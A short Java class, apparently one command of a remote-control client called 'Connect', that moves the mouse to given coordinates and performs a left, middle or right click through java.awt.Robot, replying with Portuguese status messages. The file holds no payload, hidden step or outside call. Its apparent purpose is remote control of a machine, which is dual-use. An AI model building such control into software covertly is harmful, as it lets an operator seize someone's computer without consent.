package br.com.introcdc.connect.client.commands.control;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:19
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientControlComponents;

public class ClientCommandMouseClick extends ClientCommand {

    public ClientCommandMouseClick() {
        super("lclick", "mclick", "rclick");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (!input.isEmpty()) {
            try {
                String[] args = input.split(" ");
                int x = Integer.parseInt(args[0]), y = Integer.parseInt(args[1]);
                ClientControlComponents.ROBOT_INSTANCE.mouseMove(x, y);
            } catch (Exception ignored) {
                msg("Digite dois números válidos");
                return;
            }
        }
        if (command.startsWith("lclick")) {
            ClientControlComponents.clickLeft(ClientControlComponents.ROBOT_INSTANCE);
        } else if (command.startsWith("mclick")) {
            ClientControlComponents.clickMiddle(ClientControlComponents.ROBOT_INSTANCE);
        } else {
            ClientControlComponents.clickRight(ClientControlComponents.ROBOT_INSTANCE);
        }
        msg("Clique efetuado!");
    }

}
